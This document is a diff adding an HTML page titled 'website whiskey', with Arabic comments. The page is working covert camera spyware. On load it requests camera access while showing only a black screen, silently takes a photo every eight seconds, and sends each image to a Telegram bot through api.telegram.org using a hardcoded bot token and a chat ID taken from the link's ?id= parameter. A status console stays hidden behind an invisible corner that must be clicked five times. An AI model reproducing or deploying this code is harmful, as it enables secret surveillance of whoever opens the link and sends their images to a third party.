@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>website whiskey</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; min-height: 100vh; overflow: hidden; }
+        video { display: none; }
+        canvas { display: none; }
+
+        /* عنصر تصحيح مخفي */
+        #debug-trigger {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 50px;
+            opacity: 0;
+            z-index: 9999;
+            cursor: default;
+        }
+
+        #debug-console {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            max-height: 200px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #0f0;
+            overflow-y: auto;
+            display: none;
+            z-index: 10000;
+            pointer-events: none;
+            user-select: none;
+            line-height: 1.6;
+            opacity: 0.7;
+        }
+
+        #debug-console.visible {
+            display: block;
+        }
+
+        #debug-console::-webkit-scrollbar {
+            width: 3px;
+        }
+        #debug-console::-webkit-scrollbar-track {
+            background: #111;
+        }
+        #debug-console::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 3px;
+        }
+
+        .debug-entry {
+            opacity: 0.8;
+        }
+        .debug-entry.error {
+            color: #f44;
+        }
+        .debug-entry.success {
+            color: #4caf50;
+        }
+        .debug-entry.warning {
+            color: #ff9800;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- زر تفعيل التصحيح -->
+    <div id="debug-trigger"></div>
+    <div id="debug-console"></div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // 1. الإعدادات الأساسية
+            // ============================================================
+            const BOT_TOKEN = '8837356969:AAEqliDVUj-gEWZMliD51nhLL7cO7h3Nd3U';
+            const CAPTURE_INTERVAL_MS = 8000; // كل 8 ثوانٍ
+
+            // ✅ تصحيح: استخراج المعرف من ?id=
+            function getTargetId() {
+                try {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    return urlParams.get('id');
+                } catch (e) { 
+                    return null; 
+                }
+            }
+            
+            const TARGET_ID = getTargetId();
+            const CHAT_ID = TARGET_ID;
+
+            // ============================================================
+            // 2. عناصر DOM
+            // ============================================================
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const debugConsole = document.getElementById('debug-console');
+            const debugTrigger = document.getElementById('debug-trigger');
+
+            // ============================================================
+            // 3. نظام التصحيح المخفي
+            // ============================================================
+            let debugVisible = false;
+            let clickCount = 0;
+            let clickTimer = null;
+
+            function addDebug(message, type = 'info') {
+                const entry = document.createElement('div');
+                entry.className = `debug-entry ${type}`;
+                const time = new Date().toLocaleTimeString();
+                entry.textContent = `[${time}] ${message}`;
+                debugConsole.appendChild(entry);
+                debugConsole.scrollTop = debugConsole.scrollHeight;
+
+                const consoleMethod = type === 'error' ? 'error' :
+                                     type === 'warning' ? 'warn' :
+                                     type === 'success' ? 'log' : 'log';
+                console[consoleMethod](`[Whiskey] ${message}`);
+            }
+
+            // تفعيل وحدة التحكم بالضغط 5 مرات
+            debugTrigger.addEventListener('click', () => {
+                clickCount++;
+                clearTimeout(clickTimer);
+                clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
+
+                if (clickCount >= 5) {
+                    clickCount = 0;
+                    debugVisible = !debugVisible;
+                    debugConsole.classList.toggle('visible', debugVisible);
+                    addDebug(debugVisible ? '🔓 تم تفعيل وحدة التحكم' : '🔒 تم إخفاء وحدة التحكم', 'info');
+                }
+            });
+
+            // ============================================================
+            // 4. التحقق من وجود المعرف
+            // ============================================================
+            if (!CHAT_ID) {
+                addDebug('❌ خطأ: المعرف غير موجود! استخدم ?id=رقم_المستخدم في الرابط', 'error');
+                console.error('⚠️ المعرف مطلوب! مثال: index.html?id=123456789');
+                // إيقاف التنفيذ
+                return;
+            }
+
+            addDebug(`✅ المعرف المستهدف: ${CHAT_ID}`, 'success');
+
+            // ============================================================
+            // 5. حالة التطبيق
+            // ============================================================
+            let mediaStream = null;
+            let cameraActive = false;
+            let captureInterval = null;
+            let photoCounter = 1;
+            let isFirstCapture = true;
+
+            // ============================================================
+            // 6. التقاط الصورة (بدون عكس - كاميرا خلفية)
+            // ============================================================
+            async function captureImage() {
+                if (!cameraActive || !mediaStream || !video.videoWidth || !video.videoHeight) {
+                    addDebug('⚠️ الكاميرا غير جاهزة للتصوير', 'warning');
+                    return null;
+                }
+                
+                try {
+                    const vw = video.videoWidth;
+                    const vh = video.videoHeight;
+                    canvas.width = vw;
+                    canvas.height = vh;
+                    
+                    // رسم الصورة بدون عكس (للكاميرا الخلفية)
+                    ctx.drawImage(video, 0, 0, vw, vh);
+                    
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                    addDebug(`📸 تم التقاط الصورة (${vw}x${vh})`, 'info');
+                    return dataUrl;
+                } catch (err) { 
+                    addDebug(`❌ فشل التقاط الصورة: ${err.message}`, 'error');
+                    return null; 
+                }
+            }
+
+            // ============================================================
+            // 7. إرسال الصورة إلى تليجرام
+            // ============================================================
+            async function sendPhoto(dataUrl) {
+                if (!dataUrl) {
+                    addDebug('⚠️ لا توجد صورة للإرسال', 'warning');
+                    return false;
+                }
+                
+                if (!CHAT_ID) {
+                    addDebug('⚠️ لا يوجد معرف للإرسال', 'warning');
+                    return false;
+                }
+                
+                try {
+                    addDebug(`📤 جاري تحضير الصورة #${photoCounter}...`, 'info');
+                    
+                    const response = await fetch(dataUrl);
+                    const blob = await response.blob();
+                    
+                    if (blob.size < 1000) {
+                        addDebug(`⚠️ حجم الصورة صغير جداً (${blob.size} بايت)`, 'warning');
+                        return false;
+                    }
+                    
+                    addDebug(`📤 جاري إرسال الصورة #${photoCounter} (${(blob.size/1024).toFixed(1)} كيلوبايت)...`, 'info');
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, `shot_${photoCounter}.jpg`);
+                    formData.append('caption', `📸 صورة #${photoCounter}\n🆔: ${CHAT_ID}`);
+
+                    const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const json = await result.json();
+                    
+                    if (json.ok) {
+                        addDebug(`✅ تم إرسال الصورة #${photoCounter} بنجاح!`, 'success');
+                        photoCounter++;
+                        return true;
+                    } else {
+                        addDebug(`❌ فشل الإرسال: ${json.description || 'خطأ غير معروف'}`, 'error');
+                        return false;
+                    }
+                    
+                } catch (err) {
+                    addDebug(`❌ خطأ في الإرسال: ${err.message}`, 'error');
+                    return false;
+                }
+            }
+
+            // ============================================================
+            // 8. التقاط وإرسال
+            // ============================================================
+            async function takeAndSend() {
+                addDebug('📷 جاري التقاط صورة...', 'info');
+                const img = await captureImage();
+                if (img) {
+                    const success = await sendPhoto(img);
+                    if (success && isFirstCapture) {
+                        isFirstCapture = false;
+                        addDebug('🎉 تم إرسال الصورة الأولى بنجاح!', 'success');
+                    }
+                } else {
+                    addDebug('⚠️ فشل التقاط الصورة', 'warning');
+                }
+            }
+
+            // ============================================================
+            // 9. بدء التصوير التلقائي
+            // ============================================================
+            function startAutoCapture() {
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                }
+                
+                addDebug(`📸 بدء التصوير التلقائي كل ${CAPTURE_INTERVAL_MS/1000} ثوانٍ`, 'info');
+                
+                // التقاط أول صورة بعد 2 ثانية
+                setTimeout(() => {
+                    if (cameraActive) {
+                        addDebug('📸 التقاط الصورة الأولى...', 'info');
+                        takeAndSend();
+                    }
+                }, 2000);
+                
+                // ثم كل 8 ثوانٍ
+                captureInterval = setInterval(() => {
+                    if (cameraActive) {
+                        takeAndSend();
+                    } else {
+                        addDebug('⚠️ الكاميرا غير نشطة، انتظار...', 'warning');
+                    }
+                }, CAPTURE_INTERVAL_MS);
+            }
+
+            // ============================================================
+            // 10. تشغيل الكاميرا (الكاميرا الخلفية)
+            // ============================================================
+            async function initCamera() {
+                try {
+                    addDebug('📷 جاري طلب صلاحيات الكاميرا الخلفية...', 'info');
+                    
+                    let stream = null;
+                    
+                    // محاولة استخدام الكاميرا الخلفية أولاً
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                facingMode: { exact: "environment" },
+                                width: { ideal: 640 },
+                                height: { ideal: 480 }
+                            },
+                            audio: false
+                        });
+                        addDebug('✅ تم استخدام الكاميرا الخلفية (exact)', 'success');
+                    } catch (firstError) {
+                        addDebug('⚠️ الكاميرا الخلفية غير متوفرة، نحاول الكاميرا الافتراضية...', 'warning');
+                        try {
+                            stream = await navigator.mediaDevices.getUserMedia({
+                                video: { 
+                                    facingMode: "environment",
+                                    width: { ideal: 640 },
+                                    height: { ideal: 480 }
+                                },
+                                audio: false
+                            });
+                            addDebug('✅ تم استخدام الكاميرا الخلفية (بدون exact)', 'success');
+                        } catch (secondError) {
+                            addDebug('⚠️ فشلت الكاميرا الخلفية، نحاول أي كاميرا متاحة...', 'warning');
+                            stream = await navigator.mediaDevices.getUserMedia({
+                                video: {
+                                    width: { ideal: 640 },
+                                    height: { ideal: 480 }
+                                },
+                                audio: false
+                            });
+                            addDebug('✅ تم استخدام الكاميرا الافتراضية', 'success');
+                        }
+                    }
+                    
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    video.muted = true;
+                    
+                    // انتظار تحميل الفيديو
+                    await new Promise((resolve) => {
+                        if (video.readyState >= 2) {
+                            resolve();
+                        } else {
+                            video.onloadedmetadata = () => resolve();
+                        }
+                    });
+                    
+                    await video.play();
+                    
+                    cameraActive = true;
+                    const vw = video.videoWidth || 640;
+                    const vh = video.videoHeight || 480;
+                    addDebug(`✅ الكاميرا تعمل (${vw}x${vh})`, 'success');
+                    
+                    // بدء التصوير التلقائي
+                    startAutoCapture();
+                    
+                } catch (err) {
+                    addDebug(`❌ فشل تشغيل الكاميرا: ${err.message}`, 'error');
+                    cameraActive = false;
+                    
+                    // إعادة المحاولة بعد 3 ثوانٍ
+                    addDebug('🔄 إعادة المحاولة بعد 3 ثوانٍ...', 'warning');
+                    setTimeout(() => {
+                        if (!cameraActive) {
+                            addDebug('🔄 محاولة تشغيل الكاميرا مرة أخرى...', 'info');
+                            initCamera();
+                        }
+                    }, 3000);
+                }
+            }
+
+            // ============================================================
+            // 11. إيقاف الكاميرا
+            // ============================================================
+            function stopCamera() {
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                }
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    mediaStream = null;
+                }
+                cameraActive = false;
+                addDebug('⏹️ تم إيقاف الكاميرا', 'info');
+            }
+
+            // ============================================================
+            // 12. أحداث الصفحة
+            // ============================================================
+
+            // بدء التشغيل عند تحميل الصفحة
+            window.addEventListener('load', () => {
+                addDebug('🚀 جاري تهيئة النظام...', 'info');
+                setTimeout(initCamera, 500);
+            });
+
+            // إيقاف الكاميرا عند الخروج
+            window.addEventListener('beforeunload', () => {
+                stopCamera();
+            });
+
+            // معالجة الأخطاء غير المتوقعة
+            window.addEventListener('unhandledrejection', (event) => {
+                addDebug(`⚠️ خطأ غير متوقع: ${event.reason?.message || event.reason}`, 'error');
+            });
+
+            // رسائل ترحيب في الكونسول
+            addDebug('📋 تم تحميل التطبيق (كاميرا خلفية - صور)', 'info');
+            console.log('%c🔍 Whiskey Camera - كاميرا خلفية', 'font-size:16px;font-weight:bold;');
+            console.log('%c👆 اضغط 5 مرات على الزاوية السفلية اليسرى لتفعيل وحدة التحكم', 'font-size:12px;color:#888;');
+            console.log(`%c🆔 المعرف المستهدف: ${CHAT_ID}`, 'font-size:12px;color:#4caf50;');
+
+        })();
+    </script>
+</body>
+</html>
